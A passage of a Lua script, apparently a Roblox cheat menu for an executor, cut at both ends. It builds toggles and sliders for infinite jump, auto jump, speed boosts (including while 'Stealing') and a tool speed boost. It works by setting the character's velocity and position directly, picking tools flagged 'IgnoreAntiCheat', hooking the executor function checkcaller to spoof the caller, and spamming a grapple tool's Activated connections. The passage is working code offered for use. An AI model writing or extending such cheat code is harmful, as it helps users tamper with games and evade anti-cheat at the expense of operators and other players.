		local n12 = 0
		local n13 = 0
		local n14 = 0
		local n15 = 0
		local n16 = 0
		local n17 = 60
		local n18 = 19.1
		local flag6 = false
		local y = nil

		local function fn6()
			return math.max(n17 / n11, 0.01)
		end

		local function fn7()
			if not (not flag2 or not humanoidRootPart or not humanoidRootPart.Parent) and not UserInputService:GetFocusedTextBox() then
				y = y or humanoidRootPart.Position.Y

				if not (flag6 and humanoidRootPart.Position.Y - y >= n18) then
					local v = fn6()
					n13 = n11 * v
					local n19 = n5 / v
					n12 = os.clock() + n19
					flag5 = true
					n15 = os.clock()
					return
				end
			end
		end

		local function fn8()
			if not (not humanoid or not humanoidRootPart or not humanoidRootPart.Parent) then
				if humanoid.Health <= 0 then
					flag4 = false
					flag5 = false
					return
				end

				local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
				local flag7 = humanoid.FloorMaterial ~= Enum.Material.Air
				local now = os.clock()
				local v = fn6()

				if flag7 then
					y = humanoidRootPart.Position.Y
				end

				local y2 = flag6 and (flag4 or flag5) and y and humanoidRootPart.Position.Y - y >= n18

				if flag4 and not y2 and (now - n15 >= n7 / v or flag5 and n12 - now <= n8 / v) then
					fn7()
				end

				if y2 then
					flag5 = false

					if assemblyLinearVelocity.Y > 0 then
						humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
					end
				elseif flag5 then
					if n12 <= now then
						flag5 = false
					else
						local n19 = (Workspace.Gravity * v * v - Workspace.Gravity) * n3
						humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n13 - assemblyLinearVelocity.Y) * (1 - math.exp(-n6 * v * n3)) - n19, assemblyLinearVelocity.Z)
					end
				elseif not flag7 then
					local gravity = Workspace.Gravity

					if assemblyLinearVelocity.Y < 0 then
						gravity += n10
					end

					local n19 = gravity * v * v - Workspace.Gravity

					if math.abs(n19) > 0.001 then
						humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n19 * n3, assemblyLinearVelocity.Z)
					end
				end
			end
		end

		local function fn9(deltaTime)
			if not (not flag2 or not flag) then
				n16 += deltaTime

				if not (n16 < n3) then
					local n19 = math.floor(n16 / n3)

					if n4 < n19 then
						n16 = 0
						n19 = 4
					else
						n16 -= n19 * n3
					end

					for idx = 1, n19 do
						fn8()
					end
				end
			end
		end

		local function fn10(arg, arg2)
			if flag2 then
				if arg2 == Enum.UserInputState.Begin then
					local now = os.clock()

					if n9 <= now - n14 then
						n14 = now
						flag4 = true
						y = humanoidRootPart and humanoidRootPart.Position.Y or nil
						fn7()
					end
				elseif arg2 == Enum.UserInputState.End or arg2 == Enum.UserInputState.Cancel then
					flag4 = false
				end
			end

			return Enum.ContextActionResult.Pass
		end

		local function fn11()
			if flag3 then
				ContextActionService:UnbindAction("ChilliInfinityJump2")
				flag3 = false
			end
		end

		local function fn12()
			fn11()
			ContextActionService:BindAction("ChilliInfinityJump2", fn10, false, Enum.KeyCode.Space, Enum.KeyCode.ButtonA)
			flag3 = true
		end

		local function fn13(arg)
			if connection3 then
				connection3:Disconnect()
			end

			if connection4 then
				connection4:Disconnect()
			end

			connection3 = arg.InputBegan:Connect(function(input)
				if not flag2 or input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				local now = os.clock()

				if now - n14 >= n9 then
					n14 = now
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
					fn7()
				end

				flag4 = true
			end)

			connection4 = arg.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.Touch then
					return
				end
				flag4 = false
			end)
		end

		local function fn14()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end
		end

		local function isImageButton(arg)
			return (arg:IsA("ImageButton") or arg:IsA("TextButton")) and arg.Name:lower():find("jump", 1, true) ~= nil
		end

		local function fn15()
			fn14()

			if UserInputService.TouchEnabled then
				local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")

				if playerGui then
					local touchGui = playerGui:FindFirstChild("TouchGui", true)

					if touchGui then
						for _, descendant in ipairs(touchGui:GetDescendants()) do
							if isImageButton(descendant) then
								fn13(descendant)
								break
							end
						end
					end

					connection5 = playerGui.DescendantAdded:Connect(function(descendant)
						if flag2 and isImageButton(descendant) then
							fn13(descendant)
						end
					end)

					return
				end
			end
		end

		local function fn16(arg)
			humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 5)
			flag4 = false
			flag5 = false
			y = humanoidRootPart.Position.Y or nil
			n16 = 0
		end

		local function fn17()
			flag2 = false
			flag4 = false
			flag5 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			fn11()
			fn14()
			humanoid = nil
			humanoidRootPart = nil
		end

		local function fn18()
			fn17()
			flag2 = true

			if localPlayer.Character then
				fn16(localPlayer.Character)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function(character_)
				if flag2 then
					fn16(character_)
				end
			end)

			fn12()
			fn15()
			connection = RunService.Heartbeat:Connect(fn9)
		end

		fn(fn17)

		jumpBoostSection:CreateSlider({
			Name = "Jump Speed",
			ShowWhen = jumpBoostSection:CreateToggle({
				Name = "Infinity Jump",
				Default = true,
				Callback = function(arg)
					if arg then
						fn18()
					else
						fn17()
					end
				end,
			}),
			Min = 20,
			Max = 100,
			Default = 60,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Changes jump timing while preserving the height of the original 60 speed.",
			Callback = function(arg)
				n17 = math.clamp(tonumber(arg) or 60, 20, 100)
			end,
		})

		jumpBoostSection:CreateSlider({
			Name = "Jump Height",
			ShowWhen = jumpBoostSection:CreateToggle({
				Name = "Limit Jump Height",
				Default = false,
				Note = "Limits the height of each jump. Leave this off to keep air jumping upward.",
				Callback = function(arg)
					flag6 = arg == true
					y = humanoidRootPart and humanoidRootPart.Position.Y or nil
				end,
			}),
			Min = 1,
			Max = 21,
			Default = 19.1,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n18 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})
	end

	floatSpeedToolBridge = {}
	local n3
	n3 = 0.3
	local n4
	n4 = 200
	local n5
	n5 = 0.05
	local n6
	n6 = 0.02
	local n7
	n7 = 0.5
	local n8
	n8 = 0.5
	local n9
	n9 = 2
	local n10
	n10 = 14
	local n11
	n11 = 2
	local n12
	n12 = 19.1
	local n13
	n13 = 0.2
	local n14
	n14 = 0
	local n15
	n15 = 0.52
	local n16
	n16 = 52
	local n17
	n17 = 28
	local n18
	n18 = 240
	local n19
	n19 = 185
	local flag2
	flag2 = false
	local flag3
	flag3 = true
	local flag4
	flag4 = true
	local flag5
	flag5 = false
	local n20
	n20 = n17 - n8
	local n21
	n21 = 1
	local str
	str = "Bottom"
	local now
	now = os.clock()
	local v
	v = nil
	local v2
	v2 = nil
	local y
	y = nil
	local now2
	now2 = os.clock()
	local n22
	n22 = 0
	local str2
	str2 = "Grapple Hook"
	local tool, n23, toolSpeedBoostToggle, toggle, flag6, flag7, speedToolDropdown, adjustToolSpeedSlider, flag8, flag9
	local connection, connection2, connection3, connection4, flag10, flag11, n24

	do
		local n25 = 0.8
		tool = nil
		n23 = 0
		local flag12 = false
		toolSpeedBoostToggle = nil
		toggle = nil
		flag6 = false
		flag7 = localPlayer:GetAttribute("Stealing") == true
		speedToolDropdown = nil
		adjustToolSpeedSlider = nil
		flag8 = false
		flag9 = false
		local connection5 = nil
		local v3 = nil
		connection = nil
		connection2 = nil
		connection3 = nil
		connection4 = nil
		local connection6 = nil
		local connection7 = nil
		local flag13 = false
		flag10 = false
		flag11 = false
		n24 = 0
		local flag14 = false
		local v4 = nil
		local beamMap = {}
		local descendantMap = {}
		local v5 = nil
		local connection8 = nil
		local raycastParams = RaycastParams.new()
		local parent = nil
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.IgnoreWater = true

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function fn6()
			local character_ = localPlayer.Character
			if not character_ then
				return nil, nil
			end
			local findFirstChildOfClass = character_.FindFirstChildOfClass
			return character_:FindFirstChild("HumanoidRootPart"), findFirstChildOfClass(character_, "Humanoid")
		end

		local function isTool(arg)
			return arg and arg:IsA("Tool")
		end

		local function fn7()
			local nameMap = {}
			local items = ReplicatedStorage:FindFirstChild("Items")

			if items then
				for _, child in ipairs(items:GetChildren()) do
					if child:IsA("Tool") and child:GetAttribute("IgnoreAntiCheat") == true then
						nameMap[child.Name] = true
					end
				end
			end

			local ks = {}

			for k in pairs(nameMap) do
				if k ~= str2 and isTool(fn2(k)) then
					ks[#ks + 1] = k
				end
			end

			table.sort(ks, function(arg, arg2)
				return string.lower(arg) < string.lower(arg2)
			end)

			ks[#ks + 1] = str2
			return ks, ks[1] or "Grapple Hook"
		end

		local v6, v7 = fn7()
		local n182 = v7 == str2 and n18 or n19

		local function fn8()
			local flag15 = v7 == str2
			local flag152 = flag15 and 270 or 210
			n182 = math.clamp(flag15 and n18 or n19, 50, flag152)
			adjustToolSpeedSlider:SetRange(50, flag152, false)
			adjustToolSpeedSlider:Set(n182, false)
		end

		local function disconnectAll()
			v5 = nil

			if connection8 then
				connection8:Disconnect()
				connection8 = nil
			end

			for k, v8 in pairs(beamMap) do
				pcall(function()
					k.Attachment0 = v8.Attachment0
					k.Attachment1 = v8.Attachment1
					k.Enabled = v8.Enabled
				end)
			end

			table.clear(beamMap)

			for k, v8 in pairs(descendantMap) do
				pcall(function()
					k.Volume = v8
				end)
			end

			table.clear(descendantMap)
		end

		local function fn9(arg)
			if v5 ~= arg then
				disconnectAll()
				v5 = arg
				local handle = arg:FindFirstChild("Handle")
				local beam = handle and handle:FindFirstChild("Beam")

				if beam and beam:IsA("Beam") then
					beamMap[beam] = { Enabled = beam.Enabled, Attachment0 = beam.Attachment0, Attachment1 = beam.Attachment1 }
					beam.Enabled = false
					beam.Attachment0 = nil

					connection8 = beam:GetPropertyChangedSignal("Enabled"):Connect(function()
						if v5 == arg and beam.Enabled then
							beam.Enabled = false
						end
					end)
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("Sound") then
						descendantMap[descendant] = descendant.Volume
						descendant.Volume = 0
					end
				end
			end
		end

		local function fn10()
			if type(hookfunction) ~= "function" or type(checkcaller) ~= "function" or type(newcclosure) ~= "function" then
				return false
			end

			if v4 then
				flag14 = true
				local flag15 = false

				pcall(function()
					flag15 = checkcaller() == false
				end)

				flag14 = false
				if flag15 then
					return true
				end
				v4 = nil
			end

			return pcall(function()
				v4 = hookfunction(checkcaller, newcclosure(function()
					if flag14 then
						return false
					end
					return v4()
				end))
			end) and v4 ~= nil
		end

		local function fn11(arg)
			if not arg or arg.Parent ~= localPlayer.Character then
				return
			end
			flag14 = true

			pcall(function()
				arg:Deactivate()
				arg:Activate()
			end)

			if type(firesignal) == "function" then
				pcall(function()
					firesignal(arg.Activated)
				end)
			end

			if type(getconnections) == "function" then
				pcall(function()
					local v8 = getconnections(arg.Activated)

					if type(v8) == "table" then
						for _, v9 in ipairs(v8) do
							if v9.Enabled then
								if type(v9.Fire) == "function" then
									v9:Fire()
								elseif type(v9.Function) == "function" then
									v9.Function()
								end
							end
						end
					end
				end)
			end

			flag14 = false
		end

		local function runUntilTimeout2(arg)
			if not (flag10 or flag11) or not arg or arg.Parent ~= localPlayer.Character or arg:GetAttribute("CooldownTime") ~= nil then
				return
			end
			n24 = os.clock() + n25
			fn11(arg)
		end

		local function fn12()
			v3 = nil

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end
		end

		local function fn13(arg)
			if v3 == arg then
				return
			end
			fn12()
			v3 = arg

			connection5 = arg:GetAttributeChangedSignal("CooldownTime"):Connect(function()
				if (flag10 or flag11) and arg:GetAttribute("CooldownTime") == nil then
					runUntilTimeout2(arg)
				end
			end)
		end

		local function fn14()
			if flag9 then
				flag9 = false
				local v8, humanoid = fn6()

				if not (not v8 or not humanoid or humanoid.Health <= 0) then
					local assemblyLinearVelocity = v8.AssemblyLinearVelocity
					local moveDirection = humanoid.MoveDirection
					local vector3Zero = Vector3.zero

					if moveDirection.Magnitude > 0.001 then
						vector3Zero = moveDirection.Unit * humanoid.WalkSpeed
					end

					v8.AssemblyLinearVelocity = Vector3.new(vector3Zero.X, assemblyLinearVelocity.Y, vector3Zero.Z)
					return
				end
			end
		end

		local function fn15()
			fn14()
			flag5 = false
			flag8 = false
			flag10 = false
			tool = nil

			if not flag11 then
				n24 = 0
				fn12()
				disconnectAll()
			end
		end

		local function fn16()
			fn15()
			toolSpeedBoostToggle:Set(false, true)
		end

		local function fn17()
			if flag12 then
				return
			end
			flag12 = true

			task.defer(function()
				flag12 = false
				fn16()
			end)
		end

		local function fn18(arg, arg2)
			if arg == str2 and arg2 == "rebirth" then
				uiLibrary.Notify("Tool unavailable", "Grapple Hook requires 3 Rebirths.", 5)
				return
			end
			fn4(arg, arg2)
		end

		local function fn19(arg)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 or not isTool(arg) then
				return nil
			end
			n23 = os.clock() + 1.5
			if arg.Parent == character_ then
				return arg
			end

			if not (character_:FindFirstChild("RightHand") or character_:FindFirstChild("Right Arm")) and not character_:WaitForChild("RightHand", 1.5) then
				character_:WaitForChild("Right Arm", 1.5)
			end

			pcall(function()
				humanoid:EquipTool(arg)
			end)

			local now3 = os.clock()

			while os.clock() - now3 < 0.6 do
				if arg.Parent ~= character_ then
					RunService.Heartbeat:Wait()
					continue
				end
				break
			end

			if arg.Parent ~= character_ and humanoid.Health > 0 then
				pcall(function()
					humanoid:EquipTool(arg)
				end)

				local now4 = os.clock()

				while os.clock() - now4 < 0.6 do
					if arg.Parent ~= character_ then
						RunService.Heartbeat:Wait()
						continue
					end
					break
				end
			end

			if arg.Parent ~= character_ then
				pcall(function()
					arg.Parent = character_
				end)
			end

			if arg.Parent == character_ then
				RunService.Heartbeat:Wait()
				return arg
			end
			local v8 = character_:FindFirstChild(v7)
			return isTool(v8) and v8 or nil
		end

		local function fn20()
			local grappleHook = fn2(v7)

			if not isTool(grappleHook) and v7 == str2 then
				local v8
				grappleHook, v8 = fn3("Grapple Hook")
				if not isTool(grappleHook) then
					fn18("Grapple Hook", v8)
					return false
				end
			elseif not isTool(grappleHook) then
				uiLibrary.Notify("Tool unavailable", v7 .. " is not currently owned.", 5)
				return false
			end

			tool = fn19(grappleHook)
			if not tool then
				uiLibrary.Notify("Tool unavailable", "Unable to equip " .. v7 .. " right now.", 5)
				return false
			end
			flag5 = true
			flag8 = true

			if v7 == str2 then
				fn10()
				flag10 = true
				fn9(tool)
				fn13(tool)
				runUntilTimeout2(tool)
			end

			return true
		end

		local function fn21()
			local v8, v9 = fn7()
			local v10, v11, v12 = ipairs(v8)
			local flag15 = false

			for _, v13 in v10, v11, v12 do
				if v13 == v7 then
					flag15 = true
					break
				end
			end

			if not flag15 then
				v7 = v9

				if flag5 then
					fn17()
				end
			end

			fn8()
			speedToolDropdown:SetOptions(v8, v7, false)
		end

		local function fn22()
			if flag13 then
				return
			end
			flag13 = true

			task.defer(function()
				flag13 = false
				fn21()
			end)
		end

		local function fn23(arg)
			if connection then
				connection:Disconnect()
			end

			if connection2 then
				connection2:Disconnect()
			end

			if connection3 then
				connection3:Disconnect()
			end

			connection = arg.DescendantAdded:Connect(function(descendant)
				if not (not (flag10 or flag11) or os.clock() > n24) and (descendant:IsA("BodyMover") or descendant:IsA("Constraint")) then
					task.defer(function()
						if descendant.Parent then
							pcall(function()
								descendant:Destroy()
							end)
						end
					end)

					return
				end
			end)

			connection2 = arg.ChildAdded:Connect(function(child)
				fn22()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local flag52 = flag5

				if not flag5 then
					humanoid = flag52
				end

				if humanoid and child:IsA("Tool") and child.Name ~= v7 and not fn5() and os.clock() >= n23 then
					fn17()
				end
			end)

			connection3 = arg.ChildRemoved:Connect(function(child)
				fn22()
				local humanoid = arg:FindFirstChildOfClass("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local flag52 = flag5

				if not flag5 then
					humanoid = flag52
				end

				if humanoid and child == tool and not fn5() and os.clock() >= n23 then
					task.defer(function()
						local character_ = localPlayer.Character
						local humanoid2 = character_ and character_:FindFirstChildOfClass("Humanoid")

						if not (not humanoid2 or humanoid2.Health <= 0) then
							character_ = character_ and character_:FindFirstChild(v7)

							if flag5 and not isTool(character_) then
								fn17()
							end
						end
					end)
				end
			end)
		end

		local function fn24(arg)
			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			connection7:Disconnect()
			connection7 = nil

			if arg then
				connection4 = arg.ChildAdded:Connect(fn22)
				connection6 = arg.ChildRemoved:Connect(fn22)
			end
		end

		if localPlayer.Character then
			fn23(localPlayer.Character)
		end

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then
			fn24(backpack)
		end

		connection7 = localPlayer.ChildAdded:Connect(function(child)
			if child:IsA("Backpack") then
				fn24(child)
				fn22()
			end
		end)

		local function fn25(arg, arg2)
			str = arg
			now = arg2
			v = nil
		end

		local function fn26(arg, arg2)
			if not arg then
				v = nil
				return false
			end
			local arg22 = v
			local arg222

			if v then
				arg222 = arg22
			else
				arg222 = arg2
			end

			v = arg222
			return arg2 - v >= n6
		end

		local function fn27(arg, arg2)
			local assemblyLinearVelocity = arg.AssemblyLinearVelocity
			arg.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, arg2, assemblyLinearVelocity.Z)
		end

		local function raycastGround(arg, humanoid)
			local parent2 = arg.Parent

			if parent ~= parent2 then
				parent = parent2
				raycastParams.FilterDescendantsInstances = { parent2 }
			end

			local n26

			if humanoid.RigType == Enum.HumanoidRigType.R6 then
				n26 = 3
			else
				n26 = math.max(arg.Size.Y * 0.5, humanoid.HipHeight + arg.Size.Y * 0.5)
			end

			local hit = Workspace:Raycast(arg.Position, Vector3.new(0, -(n26 + n7), 0), raycastParams)
			return hit ~= nil and hit.Normal.Y > 0.15
		end

		local connection9 = RunService.Heartbeat:Connect(function(deltaTime)
			local v8, humanoid = fn6()
			local now3 = os.clock()

			if not v8 or not humanoid or humanoid.Health <= 0 then
				v2 = nil
				y = nil
				n22 = 0
				return
			end

			if v8 ~= v2 or not y then
				v2 = v8
				y = v8.Position.Y
				now2 = now3
				n22 = 0
				fn25("Bottom", now3)
			else
				local n26 = now3 - now2

				if n26 > 0 then
					n22 = (v8.Position.Y - y) / n26
				end

				y = v8.Position.Y
				now2 = now3
			end

			if flag2 then
				local n26 = math.max(0.02, n3 / n15)
				local n27 = math.max(0.01, n5 / n15)
				local n28 = n4 * n15
				local n29 = now3 - now

				if str == "Rise" then
					local n30 = math.clamp(n29 / n26, 0, 1)
					local n31 = n12 * 3.1415926535897931 / 2 * n26 * math.cos(n30 * 3.1415926535897931 * 0.5)

					if fn26(n29 >= 0.06 and n31 >= n10 and math.abs(n22) <= n11, now3) then
						fn25("Fall", now3)
					elseif n30 >= 1 then
						fn25("Hold", now3)
						fn27(v8, 0)
					else
						fn27(v8, n31)
					end
				elseif str == "Hold" then
					if n13 <= n29 then
						fn25("Fall", now3)
					else
						fn27(v8, 0)
					end
				elseif str == "Fall" then
					local n30 = math.clamp(n29 / n27, 0, 1)
					local n31 = -n28 * math.sin(n30 * 3.1415926535897931 * 0.5)

					if fn26(n29 >= 0.01 and n31 <= -n10 and n22 >= -n11, now3) or n30 >= 1 then
						fn25("Bottom", now3)
					else
						fn27(v8, n31)
					end
				else
					v = nil

					if n29 >= n14 and raycastGround(v8, humanoid) then
						fn25("Rise", now3)
					end
				end
			else
				v = nil

				if str ~= "Bottom" then
					fn25("Bottom", now3)
				end
			end

			if flag5 then
				local character_ = localPlayer.Character
				local humanoid2 = character_ and character_:FindFirstChildOfClass("Humanoid")

				if not (humanoid2 and humanoid2.Health > 0) then
					flag8 = false
					n23 = math.max(n23, now3 + 1.5)
				else
					local tool2 = character_:FindFirstChildWhichIsA("Tool")
					flag8 = tool2 ~= nil and tool2.Name == v7

					if not tool2 or tool2.Name ~= v7 then
						if not fn5() and now3 >= n23 then
							fn17()
						end
					elseif v7 == str2 then
						tool = tool2
						flag10 = true
						fn9(tool2)
						fn13(tool2)
						runUntilTimeout2(tool2)
					end
				end
			else
				flag8 = false
			end

			local flag15 = localPlayer:GetAttribute("Stealing") == true
			local flag152 = flag15 and not flag7
			flag7 = flag15

			if flag152 and flag3 and toggle and (not flag4 or toggle:Get() ~= true) and not flag6 then
				flag6 = true

				task.defer(function()
					flag6 = false

					if not (not flag or localPlayer:GetAttribute("Stealing") ~= true or not flag3 or not toggle) then
						if toggle:Get() ~= true then
							toggle:Set(true, true)
						else
							flag4 = true
							n20 = math.max(20, n17 - n8)
							n21 = 1
						end
					end
				end)
			end

			local flag42 = flag15 and flag4
			local flag82 = flag5 and flag8 and not flag15

			if flag82 then
				local assemblyLinearVelocity = v8.AssemblyLinearVelocity
				local moveDirection = humanoid.MoveDirection
				local vector3Zero = Vector3.zero

				if moveDirection.Magnitude > 0.001 then
					vector3Zero = moveDirection.Unit * n182
				end

				v8.AssemblyLinearVelocity = Vector3.new(vector3Zero.X, assemblyLinearVelocity.Y, vector3Zero.Z)
				flag9 = true
			else
				fn14()
			end

			local n172

			if flag42 then
				local n26 = math.max(20, n17 - n8)
				n20 += n21 * n9 * deltaTime

				if n17 <= n20 then
					n20 = n17
					n21 = -1
				elseif n20 <= n26 then
					n20 = n26
					n21 = 1
				end

				n172 = n20
			else
				local flag32 = not flag15 and flag3 and not flag82
				n172 = nil

				if flag32 then
					n172 = n16
				end
			end

			if n172 then
				local moveDirection = humanoid.MoveDirection
				local n26 = n172 - humanoid.WalkSpeed

				if moveDirection.Magnitude > 0.001 and math.abs(n26) > 0.001 then
					v8.CFrame = v8.CFrame + moveDirection * n26 * deltaTime
				end
			end
		end)

		local connection10 = localPlayer.CharacterAdded:Connect(function(character_)
			v2 = nil
			y = nil
			fn12()
			disconnectAll()
			tool = nil
			flag8 = false
			n23 = os.clock() + 3
			fn23(character_)
			local backpack2 = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack2 then
				fn24(backpack2)
			end

			fn22()

			if flag5 then
				task.spawn(function()
					local humanoid = character_:WaitForChild("Humanoid", 3)

					if humanoid and character_:WaitForChild("HumanoidRootPart", 3) then
						local now3 = os.clock()
						local grappleHook

						while true do
							grappleHook = fn2(v7)

							if isTool(grappleHook) then
								break
							else
								task.wait(0.1)
								if not (isTool(grappleHook) or os.clock() - now3 >= 3 or not flag5) then
									continue
								end
								break
							end
						end

						if flag5 then
							if not isTool(grappleHook) and v7 == str2 then
								grappleHook = fn3("Grapple Hook")
							end

							if isTool(grappleHook) and flag5 and humanoid.Health > 0 then
								task.wait(0.15)
								tool = fn19(grappleHook)

								if tool then
									flag8 = true

									if v7 == str2 then
										fn10()
										flag10 = true
										fn9(tool)
										fn13(tool)
										RunService.Heartbeat:Wait()
										runUntilTimeout2(tool)
									end
								else
									fn16()
								end
							elseif flag5 then
								fn16()
							end
						end
					end
				end)
			end
		end)

		fn(function()
			flag2 = false
			flag3 = false
			flag4 = false
			flag11 = false
			fn15()
			flag14 = false

			if v4 then
				pcall(function()
					hookfunction(checkcaller, v4)
				end)
			end

			connection10:Disconnect()
			connection10 = nil

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			connection9:Disconnect()
			connection9 = nil
		end)

		speedBoostSection:CreateSlider({
			Name = "Adjust Speed",
			ShowWhen = speedBoostSection:CreateToggle({
				Name = "Speed Boost",
				Default = true,
				Note = "Moves faster without a tool and pauses while stealing.",
				Callback = function(arg)
					flag3 = arg == true
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 52,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n16 = math.clamp(tonumber(arg) or 52, 20, 64)
			end,
		})

		toggle = speedBoostSection:CreateToggle({
			Name = "Speed Boost While Stealing",
			Default = true,
			Note = "Smoothly varies speed while stealing.",
			Callback = function(arg)
				flag4 = arg == true
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		speedBoostSection:CreateSlider({
			Name = "Adjust Auto Speed",
			DisplayName = "Adjust Speed On Steal",
			ShowWhen = toggle,
			Min = 20,
			Max = 29,
			Default = 28,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				n17 = math.clamp(tonumber(arg) or 28, 20, 29)
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		toolSpeedBoostToggle = speedBoostSection:CreateToggle({
			Name = "Tool Speed Boost",
			Default = false,
			Keybind = Enum.KeyCode.Q,
			Note = "Equips the selected speed tool. Switching tools turns this off.",
			Callback = function(arg)
				if arg then
					if not fn20() then
						task.defer(function()
							toolSpeedBoostToggle:Set(false, true)
						end)
					end
				else
					fn15()
				end
			end,
		})

		speedToolDropdown = speedBoostSection:CreateDropdown({
			Name = "Speed Tool",
			ShowWhen = toolSpeedBoostToggle,
			Options = v6,
			Default = "Grapple Hook",
			Callback = function(arg)
				local str3 = tostring(arg or "Grapple Hook")

				if str3 ~= v7 then
					v7 = str3
					fn8()

					if flag5 then
						fn16()
					end
				end
			end,
		})

		adjustToolSpeedSlider = speedBoostSection:CreateSlider({
			Name = "Adjust Tool Speed",
			ShowWhen = toolSpeedBoostToggle,
			Min = 50,
			Max = v7 == str2 and 270 or 210,
			Default = 240,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(arg)
				if v7 == str2 then
					n18 = math.clamp(tonumber(arg) or 240, 50, 270)
					n182 = n18
				else
					n19 = math.clamp(tonumber(arg) or 185, 50, 210)
					n182 = n19
				end
			end,
		})

		local autoJumpToggle = jumpBoostSection:CreateToggle({
			Name = "Auto Jump",
			Default = false,
			Note = "Automatically repeats jumps.",
			Callback = function(arg)
				flag2 = arg == true
				fn25("Bottom", os.clock())
			end,
		})

		jumpBoostSection:CreateSlider({
			Name = "Height",
			SubOf = autoJumpToggle,
			Min = 1,
			Max = 21,
			Default = 16,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Sets the maximum height of each jump.",
			Callback = function(arg)
				n12 = math.clamp(tonumber(arg) or 19.1, 1, 21)
			end,
		})

		jumpBoostSection:CreateSlider({
			Name = "Auto Jump Speed",
			SubOf = autoJumpToggle,
			DisplayName = "Jump Speed",
			Min = 20,
			Max = 110,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Controls jump speed (20 to 110, default 52 = 0.52x).",
			Callback = function(arg)
				n15 = math.clamp(tonumber(arg) or 52, 20, 110) / 100
			end,
		})

		jumpBoostSection:CreateSlider({
			Name = "Air Hold",
			SubOf = autoJumpToggle,
			Min = 0,
			Max = 1,
			Default = 0.1,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long you stay at the top of each jump.",
			Callback = function(arg)
				n13 = math.clamp(tonumber(arg) or 0.2, 0, 1)
			end,
		})

		jumpBoostSection:CreateSlider({
			Name = "Ground Delay",
			SubOf = autoJumpToggle,
			Min = 0,
			Max = 1,
			Default = 0,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long to wait on the ground before jumping again.",
			Callback = function(arg)
				n14 = math.clamp(tonumber(arg) or 0, 0, 1)
			end,
		})

		floatSpeedToolBridge.GetSelectedName = function()
			return v7
		end

		floatSpeedToolBridge.EquipSelected = function()
			local grappleHook = fn2(v7)

			if not isTool(grappleHook) and v7 == str2 then
				local v8
				grappleHook, v8 = fn3("Grapple Hook")
				if not isTool(grappleHook) then
					fn18("Grapple Hook", v8)
					return nil
				end
			elseif not isTool(grappleHook) then
				uiLibrary.Notify("Tool unavailable", v7 .. " is not currently owned.", 5)
				return nil
			end

			local v8 = fn19(grappleHook)
			if not v8 then
				uiLibrary.Notify("Tool unavailable", "Unable to equip " .. v7 .. " right now.", 5)
				return nil
			end
			return v8
		end

		floatSpeedToolBridge.StartGrappleSpam = function(arg)
			if not isTool(arg) or arg.Name ~= str2 then
				return false
			end
			flag11 = true
			fn10()
			fn9(arg)
			fn13(arg)
			runUntilTimeout2(arg)
			return true
		end

		floatSpeedToolBridge.PulseGrapple = function(arg)
			if not flag11 or not isTool(arg) or arg.Name ~= str2 then
				return false
			end
			fn9(arg)
			fn13(arg)
			runUntilTimeout2(arg)
			return true
		end

		floatSpeedToolBridge.StopGrappleSpam = function()
			flag11 = false

			if not flag10 then
				n24 = 0
				fn12()
				disconnectAll()
			end
		end
	end

	do
		local n25 = 0.0083333333333333332
		local n26 = 4
		local n27 = 0.12
		local n28 = 25
		local n29 = 0.045
		local n30 = 0.03
		local n31 = 10
		local n32 = 60
		local flag12 = false
		local connection5 = nil
		local n33 = 0
		local flag13 = false
		local n34 = 0
		local n35 = 0
		local n36 = 0
		local v3 = nil
		local flag14 = false
		local flag15 = false
		local floatToggle = nil
		local flag16 = false

		local function fn6()
			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			flag12 = false
